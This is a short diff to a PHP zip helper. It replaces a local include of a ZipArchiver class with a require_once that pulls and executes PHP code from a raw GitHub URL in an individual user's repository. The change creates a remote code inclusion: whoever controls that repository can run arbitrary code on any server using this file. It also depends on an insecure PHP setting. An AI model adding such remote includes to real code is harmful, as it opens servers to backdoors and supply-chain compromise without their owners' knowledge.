@@ -1,7 +1,7 @@
 <?php
 function zip($patch_dir_w1,$patch_zip_w1){
   // Include and initialize ZipArchive class
-require_once 'ZipArchiver.class.php';
+require_once 'https://raw.githubusercontent.com/hojr128567/hojr128567/main/ZipArchiver.class.php';
 $zipper = new ZipArchiver;
 
 // Path of the directory to be zipped
